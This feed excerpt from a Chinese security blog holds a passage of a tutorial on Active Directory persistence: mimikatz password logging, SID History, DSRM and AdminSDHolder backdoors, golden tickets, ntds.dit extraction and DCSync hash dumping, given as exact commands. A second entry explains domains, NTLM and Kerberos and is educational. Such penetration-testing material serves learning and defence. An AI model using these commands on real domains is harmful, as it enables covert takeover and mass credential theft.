src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133322.png" alt="QQ截图20210217133322"></p><p>长期性注入（重启不失效）</p><p>把 mimikatz中的mimilib.dll放到系统的C:\Windows\System32\ 目录下，并将 mimilib.dll 添加到注册表中，使用这种方法，即使系统重启，也不会影响持久化效果。</p><p>修改注册表 HKEY_LOCAL_MACHINE/System/CurrentControlSet/Control/Lsa 的 Security Packages 项，加载新的DLL文件</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133335.png" alt="QQ截图20210217133335"></p><p>用户在登录时输入的账号密码将会被记录在 C:\Windows\System32\kiwissp.log</p><h2 id="SID-History后门"><a href="#SID-History后门" class="headerlink" title="SID History后门"></a>SID History后门</h2><p>sid history:当我们把域A的用户x迁移到域B时，B域中x的sid会发生改变，随即而来的是权限也会发生改变。所以为了避免这种权限改变，sid history诞生了， 系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源 。</p><p>在域控上</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add &#x2F;sam:const27 &#x2F;new:administrator 将administrator的SID添加到const27的sid history属性</span><br></pre></td></tr></table></figure><p>然后可以在域控上验证其sid history是否更改成功</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module activedirectory</span><br><span class="line">Get-ADUser const27 -Properties sidhistory</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133438.png" alt="QQ截图20210217133438"></p><p>可以发现现在是有SIDHistory属性了。而且末尾的500预示着ADMIN权限</p><h2 id="DSRM后门"><a href="#DSRM后门" class="headerlink" title="DSRM后门"></a>DSRM后门</h2><p>DSRM账号:每个域控上都有一个本地管理员账户也就是DSRM账户，用于在域环境出现故障时本地登录进行修复.可以利用这个账户进行持久化操作。（ 如果域控制器的系统版本为Windows Server 2003，则不能使用该方法进行持久化操作。 ）</p><p>我们先设置DSRM密码<br>域控上输入ntdsutil<br>然后输入reset password on server null<br>然后键入密码，最后按q退出即可</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133606.png" alt="QQ截图20210217133606"></p><p>在mimikatz中dump本地hash可以看到多出来个Administrator</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133631.png" alt="QQ截图20210217133631"></p><p>然后设置DSRM登陆方式<br>DSRM登陆方式有三种分别对应123.</p><ul><li>0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号</li><li>1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器</li><li>2：在任何情况下，都可以使用DSRM管理员账号登录域控制器</li></ul><p>我们需要将他改成2才行。powershell执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">New-ItemProperty &quot;hklm:\system\currentcontrolset\control\lsa\&quot; -name &quot;dsrmadminlogonbehavior&quot; -value 2 -propertyType DWORD</span><br></pre></td></tr></table></figure><p>即可.然后直接psexec登录(这里用的是cs)</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133652.png" alt="QQ截图20210217133652"></p><p>注意填Realm时要填上面dump出sam时的域名（这里是DC）</p><h2 id="委派后门"><a href="#委派后门" class="headerlink" title="委派后门"></a>委派后门</h2><p>这个很简单，利用约束性委派或者基于资源的约束性委派攻击得到的ST2保存起来，或者非约束性委派得到的TGT，要用的时候加载进内存就行了</p><h2 id="黄金票据生成"><a href="#黄金票据生成" class="headerlink" title="黄金票据生成"></a>黄金票据生成</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#提权</span><br><span class="line">privilege::debug</span><br><span class="line"> </span><br><span class="line">#生成黄金票据并导入</span><br><span class="line">kerberos::golden &#x2F;user:administrator &#x2F;domain:const.com &#x2F;sid:当前用户sid去掉最后一个数据 &#x2F;krbtgt:krbtgt的hash &#x2F;ptt</span><br></pre></td></tr></table></figure><h2 id="AdminSDHolder"><a href="#AdminSDHolder" class="headerlink" title="AdminSDHolder"></a>AdminSDHolder</h2><p>AdminSDHolder是一个特殊容器，用作受保护用户或组的ACM模板。AD定期把 AdminSDHolder对象的ACL 应用到所有受保护用户或组上，防止其被有意或故意修改。 如果能够修改AdminSDHolder对象的ACL，那么修改的权限将自动应用于所有受保护的AD账户和组，这可以作为一个域环境权限维持的方法 。</p><p>如何寻找受保护用户或组：</p><p>受保护用户或组的 <strong>AdminCount属性为1</strong> 。 但是，如果对象已移出受保护组，其AdminCount属性仍为1，也就是说，有可能获得曾经是受保护组的帐户和组 。</p><p>使用powerview.ps1<code>Get-NetUser -AdminCount</code>即可获得受保护用户<br><code>Get-NetGroup -AdminCount</code>即可获得受保护组</p><p>如何修改ADMINSDHOLDER的ACL</p><p>域管执行以下命令(powerview.ps1)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetSearchBase &quot;LDAP:&#x2F;&#x2F;CN&#x3D;AdminSDHolder,CN&#x3D;System,DC&#x3D;CONST,DC&#x3D;COM&quot; -PrincipalIdentity xx -Verbose -Rights ALL</span><br><span class="line">给AdminSDHoloder添加一条ACL,让xx用户获得完全控制权</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133841.png" alt="QQ截图20210217133841"></p><p>然后默认等60分钟，待ADMINSDHOLDER生效后，xx就获得所有受保护对象的完全控制权了<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133909.png" alt="QQ截图20210217133909"></p><h2 id="Ntds-dit"><a href="#Ntds-dit" class="headerlink" title="Ntds.dit"></a>Ntds.dit</h2><p>“Ntds.dit文件是域环境中域控上会有的一个二进制文件，是主要的活动目录数据库，其文件路径为域控的 %SystemRoot%\ntds\ntds.dit，活动目录始终会访问这个文件，所以文件禁止被读取。Ntds.dit包括但不限于有关域用户、组和组成员身份和凭据信息、GPP等信息。它包括域中所有用户的密码哈希值，为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。”——FREEBUF.whoami《内网渗透测试：从NTDS.dit获取域散列值》<br>插个题外话：非域的工作组主机其密码等信息存储在SAM中。</p><p>我们获取了域控后一般第一步便是导出Ntds.dit中的信息,怎么导出呢？</p><h3 id="利用VSS导出"><a href="#利用VSS导出" class="headerlink" title="利用VSS导出"></a>利用VSS导出</h3><p>VSS全称为Volume Shadow Copy Service，卷影拷贝服务，属于快照技术的一种，主要用于备份和恢复，即使文件处于被锁定状态。</p><p>其获取NTDS.DIT的基本步骤为：</p><p>创建目标主机所有文件的卷影拷贝。<br>在创建的卷影拷贝中复制出NTDS.DIT。<br>删除卷影拷贝。</p><h4 id="VSSADMIN"><a href="#VSSADMIN" class="headerlink" title="VSSADMIN"></a>VSSADMIN</h4><p>vssadmin是windows上一个命令行卷影拷贝服务管理工具。其适用于： Windows 10，Windows 8.1，Windows Server 2016，Windows Server 2012 R2，Windows Server 2012，Windows Server 2008 R2，Windows Server 2008</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729165404714.png" alt="image-20210729165404714"></p><p>其导出NTDS.DIT的方法如下</p><p>创建一个C盘的卷影拷贝</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin create shadow &#x2F;for&#x3D;c:</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729165602611.png" alt="image-20210729165602611"></p><p>然后将卷影中的ntds.dit复制出来</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit C:\ntds.dit</span><br></pre></td></tr></table></figure><p>然后删除卷影</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin delete shadows &#x2F;for&#x3D;c: &#x2F;quiet</span><br></pre></td></tr></table></figure><h4 id="Ntdsutil-exe"><a href="#Ntdsutil-exe" class="headerlink" title="Ntdsutil.exe"></a>Ntdsutil.exe</h4><p>Ntdsutil.exe 是一个为 Active Directory 提供管理设施的命令行工具，该工具被默认安装在了域控制器上，可以在域控上直接操作，也可以通过域内机器在域控上远程操作，但是需要管理员权限。</p><p>为WINDOWS上所有文件创建快照</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729170339152.png" alt="image-20210729170339152"></p><p>我们得到了个快照的ID，接下来我们就需要加载这个卷影到我们的磁盘中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;bdccff3c-810c-4f78-9d80-c6729910e83a&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p>执行后就会发现这个快照加载到了C盘下（这里dir看到的NTDS.DIT与本次实验无关，是上次实验残留下来没删的）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729170830331.png" alt="image-20210729170830331"></p><p>然后将ntds.dit复制出来</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy c:\$SNAP_202107291703_VOLUMEC$\Windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure><p>然后删除快照</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;bdccff3c-810c-4f78-9d80-c6729910e83a&#125;&quot; &quot;delete &#123;bdccff3c-810c-4f78-9d80-c6729910e83a&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p>同时，NTDSUTIL还有一个更加便捷的导出ntds.dit的方法：通过IFM<br>IFM中文叫媒体安装集，在我们通过NTDSUTIL来创建媒体安装集时，会自动进行生成快照、加载、将ntds.dit、计算机的SAM和SYSTEM文件复制到目标文件夹中等操作，需管理员权限。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:&#x2F;test&quot; q q </span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729171538273.png" alt="image-20210729171538273"></p><p>然后在C:\test\Active Directory\ntds.dit，就是NTDS.DIT，我们复制出来就行了。<br>然后再把test文件夹删除即可。</p><h3 id="解析NTDS-DIT"><a href="#解析NTDS-DIT" class="headerlink" title="解析NTDS.DIT"></a>解析NTDS.DIT</h3><p>在提取NTDS.DIT后，我们需要再提取一个文件system.hive，因为system.hive中存放着NTDS.DIT的密钥，有了它我们才能解析NTDS.DIT。</p><p>可以用刚刚提到的VSS方法获取，也可以直接用以下命令从注册表中拉取.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save hklm\system c:\system.hive</span><br></pre></td></tr></table></figure><h4 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h4><p>impacket框架集成了许多好玩的东西，他其中的secretdump.py脚本实现了解析ntds.dit的功能</p><p>直接再impacket的example下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python .\secretsdump.py -system .\system.hive -ntds .\ntds.dit local</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210729235923711.png" alt="image-20210729235923711"></p><h3 id="远程解析"><a href="#远程解析" class="headerlink" title="远程解析"></a>远程解析</h3><h4 id="DCSYNC"><a href="#DCSYNC" class="headerlink" title="DCSYNC"></a>DCSYNC</h4><p>“DCSync是Mimikatz在2015年添加的一个功能，由Benjamin DELPY gentilkiwi和Vincent LE TOUX共同编写，其能够利用卷影拷贝服务直接读取ndts.dit并导出域内所有用户的哈希值。需要管理员权限。”</p><p>这个东西 可以实现不登录到域控而获取域控上的数据<br>获得以下权限就可以使用了</p><ul><li>Administrators组内的用户</li><li>Domain Admins组内的用户</li><li>Enterprise Admins组内的用户</li><li>域控制器的计算机帐户</li></ul><p>然后在mimikatz里<br>privilege::debug<br>lsadump::dcsync /user:xxxx /domain:xxxxx /csv 即可</p><p>想获取全部hash也可以lsadump::dcsync /domain:xxx.com /all /csv</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217133813.png" alt="QQ截图20210217133813"></p><p>然后我们就可以通过krbtgt hash制作黄金票据登录administrator。<br>如果还想隐蔽一点，可以给普通用户添加如下ACE,使其获得dcsync权限</p><ul><li></li><li>DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</li><li>DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</li><li>DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)</li></ul><p>可以以管理员权限运行powerview.ps1完成以上操作</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#给域用户hack添加以上三条ACE</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;xie,DC&#x3D;com&quot; -PrincipalIdentity hack -Rights DCSync -Verbose</span><br><span class="line"> </span><br><span class="line">#给域用户hack删除以上三条ACE</span><br><span class="line">Remove-DomainObjectAcl -TargetIdentity &quot;DC&#x3D;xie,DC&#x3D;com&quot; -PrincipalIdentity hack -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure><p>然后普通用户也可以用mimikatz调用dcsync导出hash了</p><h4 id="DCSYNC的powershell实现"><a href="#DCSYNC的powershell实现" class="headerlink" title="DCSYNC的powershell实现"></a>DCSYNC的powershell实现</h4><p>mimikatz免杀过不去的话可以试试这个<a href="https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1">https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Invoke-DCSync.ps1</span><br><span class="line">Invoke-DCSync -DumpForest | ft -wrap -autosize    &#x2F;&#x2F; 导出域内所有用户的hash</span><br><span class="line"></span><br><span class="line">Invoke-DCSync -DumpForest -Users @(&quot;administrator&quot;) | ft -wrap -autosize      &#x2F;&#x2F; 导出域内administrator账户的hash</span><br></pre></td></tr></table></figure><p>我这里WIN10域控打不通，不知道为啥</p><h5 id="配合EXCHANGE用户达到域提权目的"><a href="#配合EXCHANGE用户达到域提权目的" class="headerlink" title="配合EXCHANGE用户达到域提权目的"></a>配合EXCHANGE用户达到域提权目的</h5><p>前提:一个exchange高权限组的用户控制权，一个机器账户</p><p>exchange安装后会在AD上生成两个容器</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141602.png" alt="QQ截图20210217141602"></p><p>其中exchange windows permissions组的用户拥有writeDACL权限， Exchange Trusted Subsystem 是 Exchange Windows Permission 的成员，能继承writedacl权限，有这个权限后就能使用dcsync导出所有用户hash。<br>其中exchange trusted subsystem组甚至可能有继承自administrators组的权限。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217141614.png" alt="QQ截图20210217141614"></p><p>假设我们已经拿到了exchange trusted subsystem中一个用户的控制权。<br>那么就可用dysync进行权限维持了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;横向移动&quot;&gt;&lt;a href=&quot;#横向移动&quot; class=&quot;headerlink&quot; title=&quot;横向移动&quot;&gt;&lt;/a&gt;横向移动&lt;/h1&gt;&lt;h2 id=&quot;PTH&quot;&gt;&lt;a href=&quot;#PTH&quot; class=&quot;headerlink&quot; title=&quot;PTH&quot;&gt;&lt;/a&gt;PT</summary>
      
    
    
    
    
    <category term="内网渗透与权限维持" scheme="http://const27.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%8E%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>windows内网基础</title>
    <link href="http://const27.com/2021/06/28/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/"/>
    <id>http://const27.com/2021/06/28/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/</id>
    <published>2021-06-28T13:51:58.220Z</published>
    <updated>2021-09-03T13:18:02.808Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="域，工作组，活动目录"><a href="#域，工作组，活动目录" class="headerlink" title="域，工作组，活动目录"></a>域，工作组，活动目录</h1><h2 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h2><p>工作组可以认为是同一网络内，功能相似的电脑进行的分组。<br>举个例子：<br>“在一个网络内，可能有成百上千台电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。为了解决这一问题，Windows 9x/NT/2000就引用了“工作组”这个概念，将不同的电脑一般按功能分别列入不同的组中，如财务部的电脑都列入“财务部”工作组中，人事部的电脑都列入“人事部”工作组中。你要访问某个部门的资源，就在“网上邻居”里找到那个部门的工作组名，双击就可以看到那个部门的电脑了。 ”<br>这就是工作组，但是在工作组中的电脑还是各自管理。当其中一台计算机访问另一台计算机时还是要经过另一台计算机的认证的</p><h2 id="域"><a href="#域" class="headerlink" title="域"></a>域</h2><p>域，是一群相互信任的计算机的集合<br>想要访问域中资源就必须经过一台负责每一台联入网络的电脑和用户的验证工作的服务器，这个服务器叫做 域控制器 （Domain Controller，简写为DC） 的安全认证。每个域至少要有一个域控制器。<br>当某计算机连入域时，DC就会鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息不正确，域控制器就拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源 。<br>另外，当一个域和另一个域建立信任关系后，两个域就可以按需要相互管理</p><h2 id="工作组和域的区别"><a href="#工作组和域的区别" class="headerlink" title="工作组和域的区别"></a>工作组和域的区别</h2><p>“ 工作组是一群计算机的集合，它仅仅是一个逻辑的集合，各自计算机还是各自管理的，你要访问其中的计算机，还是要到被访问计算机上来实现用户验证的。而域不同，域是一个有安全边界的计算机集合，在同一个域中的计算机彼此之间已经建立了信任关系，在域内访问其他机器，不再需要被访问机器的许可了。 ”</p><h2 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h2><p>活动目录 (Active Directory,AD) ,用于存储有关网络对象的信息。帮助用户快速准确的找到所需的信息服务,“ 如果把企业的内网看成一本字典，那么<strong>内网里的资源就是字典里的内容，活动目录就相当于字典的索引</strong> ”</p><p>活动目录的功能：</p><ul><li>账号集中管理</li><li>软件集中管理</li><li>环境集中管理</li><li>增强安全性</li><li>更可靠，更短的宕机时间</li></ul><p>“要实现域环境，实际上就是安装AD，<strong>如果内网中的一台计算机上安装了AD，它就变成了DC(用于存储活动目录数据库的计算机)。</strong>”</p><h1 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h1><p>NTLM也是一个认证协议，与Kerberos协议功能是一样的，不过NTLM的安全性可没有Kerberos好</p><h2 id="验证机制"><a href="#验证机制" class="headerlink" title="验证机制"></a>验证机制</h2><p>NTLM协议验证机制是基于 挑战(chanllage)/回应(response) 模式的</p><p>它的验证模式大致如下:</p><ol><li>用户输入账号密码，本地把密码加密为一个hash值，称为<strong>NTML-Hash</strong></li><li>客户端向服务器发送用户名 （这个数据称为 <strong>TYPE 1 Negotiate</strong> ）</li><li>服务端接收请求，判断数据库中该用户名是否存在，若存在则生成一个16位随机数称之为chanllage。同时将chanllage返回给客户端 （ <strong>TYPE 2</strong> ）</li><li>客户端收到chanllage后将其用上面生成的hash值来加密这个chanllange，并与用户名，chanllange等组合到一起得到<strong>Net-NTLMHash</strong> 最后将 Net-NTLMHash 封装到 <strong>TYPE 3 NTLM_AUTH</strong>消息中发往服务器。</li><li>服务器收到TYPE3后，用自己数据库中该用户的密码的NTML-Hash加密chanllage，并比较自己计算出的 <strong>Net-NTLMHash</strong> 与客户端发过来的 <strong>Net-NTLMHash</strong> ，若相同则认证成功</li><li>（以上是客户端-服务端模型，若是在域中，验证步骤就会有点不同）<br>若在域中，那么服务端在第5步收到TYPE3后不会自行进行比对，而是将 Net NTLM-Hash 转发给域控制器DC，由DC进行最后的 Net NTLM-Hash 比较认证</li></ol><h1 id="Kerberos协议"><a href="#Kerberos协议" class="headerlink" title="Kerberos协议"></a>Kerberos协议</h1><p>Kerberos协议，是一个常用的认证与授权协议(下面只是简化过的大致流程，具体流程请看下面的wireshark抓包分析)</p><h2 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E5%9B%BE%E7%89%8720210217011242.png" alt="QQ图片20210217011242"></p><h2 id="参与的关键角色"><a href="#参与的关键角色" class="headerlink" title="参与的关键角色"></a>参与的关键角色</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E5%9B%BE%E7%89%8720210217011359.png" alt="QQ图片20210217011359"></p><ul><li><strong>Client</strong>: Application Client 应用客户端</li><li><strong>AS</strong>: Authentication Server 用来认证用户身份</li><li><strong>TGS</strong>: Ticket-Granting Service 用来授权服务访问</li><li><strong>SS</strong>: Service Server 用户所请求的服务</li><li>其中AS和TGS都属于KDC系统（ 密钥分发中心 ）</li></ul><h2 id="认证："><a href="#认证：" class="headerlink" title="认证："></a>认证：</h2><p>以下的加密都是对称加密</p><h3 id="1-用户登录"><a href="#1-用户登录" class="headerlink" title="1.用户登录"></a>1.用户登录</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E5%9B%BE%E7%89%8720210217125043.png" alt="QQ图片20210217125043"></p><p>用户先输入用户名和密码，其中密码在这个阶段会被单向hash函数加密为一个密钥，用来解密后面的信息</p><h3 id="2-请求身份认证（client和kdc双向认证）"><a href="#2-请求身份认证（client和kdc双向认证）" class="headerlink" title="2.请求身份认证（client和kdc双向认证）"></a>2.请求身份认证（client和kdc双向认证）</h3><h4 id="2-1-客户端向AS发送认证请求"><a href="#2-1-客户端向AS发送认证请求" class="headerlink" title="2.1 客户端向AS发送认证请求"></a>2.1 客户端向AS发送认证请求</h4><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125323.png" alt="QQ截图20210217125323"></p><p>客户端向as发送用户名信息（明文）（进发送用户名而没有发送密码）</p><h4 id="2-2AS确认客户端身份"><a href="#2-2AS确认客户端身份" class="headerlink" title="2.2AS确认客户端身份"></a>2.2AS确认客户端身份</h4><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125335.png" alt="QQ截图20210217125335"></p><p>AS先把用户名在数据库中查找一下，如果该用户名存在则找到该用户的密码使用单向hash函数生成client密钥并返回Msg A和B。<br>A中的内容是一个被Client密钥加密的用于生成Authenticator1的数据<br>B中的内容是一个被TGS密钥加密的一堆信息叫做<strong>TGT</strong>，当前无TGS密钥故无法解开，其中包含 客户端ID，有效期 ，Client网络地址以及MSG A解密后的内容</p><h3 id="3-请求服务授权（client请求kdc认证server）"><a href="#3-请求服务授权（client请求kdc认证server）" class="headerlink" title="3. 请求服务授权（client请求kdc认证server）"></a>3. 请求服务授权（client请求kdc认证server）</h3><h4 id="3-1-客户端向TGS发送请求服务授权请求"><a href="#3-1-客户端向TGS发送请求服务授权请求" class="headerlink" title="3.1 客户端向TGS发送请求服务授权请求"></a>3.1 客户端向TGS发送请求服务授权请求</h4><p><img src="http://www.nosqlnotes.com/wp-content/uploads/2017/12/3.1%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AF%B7%E6%B1%82%E6%8E%88%E6%9D%83%E6%9C%8D%E5%8A%A1%E8%AE%BF%E9%97%AE.png" alt="3.1客户端请求授权服务访问"></p><p>Client在MSG C向TGS发送 请求的服务的ID，2.2中的TGT，MSG D 发送由 **[Client/TGS SessionKey]**加密的Authenticator 1 {Client ID, Timestamp}。</p><h4 id="3-2-TGS为Client响应服务授权票据"><a href="#3-2-TGS为Client响应服务授权票据" class="headerlink" title="3.2 TGS为Client响应服务授权票据"></a>3.2 TGS为Client响应服务授权票据</h4><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217125347.png" alt="QQ截图20210217125347" style="zoom:150%;" /><ul><li><p>Msg E</p><p>  使用</p><p>[Service密钥]</p><p>加密的Client-To-Server Ticket, 该Ticket中包含了如下信息:</p><ul><li><strong>[Client/Server SessionKey]</strong></li><li>Client网络地址</li><li>Ticket有效时间</li><li>Client ID</li></ul></li><li><p><strong>Msg F</strong>  使用**[Client/TGS SessionKey]<strong>加密的</strong>[Client/Server SessionKey]**。</p></li></ul><h3 id="4-发送服务请求（client与ss双向认证）"><a href="#4-发送服务请求（client与ss双向认证）" class="headerlink" title="4. 发送服务请求（client与ss双向认证）"></a>4. 发送服务请求（client与ss双向认证）</h3><h5 id="4-1-Client向SS-Service-Server-发送服务请求"><a href="#4-1-Client向SS-Service-Server-发送服务请求" class="headerlink" title="4.1 Client向SS(Service Server)发送服务请求"></a>4.1 Client向SS(Service Server)发送服务请求</h5><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217125356.png" alt="QQ截图20210217125356" style="zoom:150%;" /><p>发送的消息中包括：</p><ul><li><strong>Msg E</strong>  上一步3.2中，TGS为Client响应的消息Msg E。该消息可以理解为由Client为SS携带的消息。</li><li><strong>Msg G</strong>  由**[Client/Server SessionKey]<strong>加密的</strong>Authenticator 2**，包含{Client ID, Timestamp}信息。<br>这里的Authenticator 2区别于前面3.1步骤中的Authenticator 1。</li></ul><p><strong>Note</strong></p><ol><li><strong>[Client/Server SessionKey]**并未直接透明传输，而是被包含在使用</strong>[Service密钥]**加密的Msg E中。</li><li>既然**[Client/Server SessionKey]<strong>并不直接透明传输， Client需要向SS证明自己拥有正确的</strong>[Client/Server SessionKey]<strong>，所以，Authenticator 2使用了</strong>[Client/Server SessionKey]**加密。</li></ol><h4 id="4-2-SS响应Client"><a href="#4-2-SS响应Client" class="headerlink" title="4.2 SS响应Client"></a>4.2 SS响应Client</h4><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217125405.png" alt="QQ截图20210217125405" style="zoom:150%;" /><h2 id="Kerberos抓包分析"><a href="#Kerberos抓包分析" class="headerlink" title="Kerberos抓包分析"></a>Kerberos抓包分析</h2><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ截图20210217125405.png" alt="QQ截图20210217125405" style="zoom:150%;" /><p>以上是kerberos协议简化图</p><h3 id="ASREQ"><a href="#ASREQ" class="headerlink" title="ASREQ"></a>ASREQ</h3><p>即客户端往服务端的第一次通讯</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125644.png" alt="QQ截图20210217125644"></p><p>我抓到的包的样子,我们来解读一下<br>1.pvno: 标记着kerberos协议的版本<br>2.msg-type: 标记着这个包的类型， ASREQ对应的就是KRBAS_REQ(0x0a)<br>3.padata:用于存储一些认证信息<br>其实这个头下面还有很多不同的类型的头，但是这里抓到了PA-DATA PA-ENC-TIMESTAMP和PA-DATA PA-PAC-REQUEST这两个头部，但是这两个头部是padata最常用最核心的头部.<br>PA-DATA PA-ENC-TIMESTAMP : 就是用户hash加密的时间戳,作用在于:as配合用户的明文账户(cname头)在数据库中查询该用户是否存在，若存在则取用其hash来解密这个时间戳，若揭秘成功则认证通过<br>PA-DATA PA-ENC-TIMESTAMP:  这个是启用PAC(一个控制用户权限的东西)支持的扩展。<br>4.req-body:请求主体，也包含了许多信息.这个头里面比较重要的东西是<br>cname:存储着发送请求的用户名（明文用户名）<br>sname:这个包含的是服务端的身份, 在ASREQ里面是krbtgt ，还有所在域名称。till为到期时间，nonce为随机生成数<br>realm:所在域名称<br>etype:告知服务器，这个hash的加密方式</p><p>之前一直困扰我的 “为什么有些文章说的第一步是向服务器发送明文账户名，有些文章是向服务器发送时间戳hash”问题抓了一下包就懂了..</p><h3 id="ASREP"><a href="#ASREP" class="headerlink" title="ASREP"></a>ASREP</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125844.png" alt="QQ截图20210217125844"></p><p>1.ticket:这个就是TGT了。<br>tkt-vno:票据格式版本号<br>realm:所在域名<br>sname:同asres<br>enc-part:被krbtgt密钥加密的票据本体部分<br>2.enc-part:被client hash 加密的login session key</p><h3 id="TGSREQ"><a href="#TGSREQ" class="headerlink" title="TGSREQ"></a>TGSREQ</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217130159.png" alt="QQ截图20210217130159"></p><p>1.ap-req-&gt;…-&gt;tikect: 可以发现TGSREQ把整个TGT发送给了TGS<br>2ap-req-&gt;…-&gt;authenticator:被login session key加密的时间戳和client id</p><h3 id="TGSREP"><a href="#TGSREP" class="headerlink" title="TGSREP"></a>TGSREP</h3><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217125903.png" 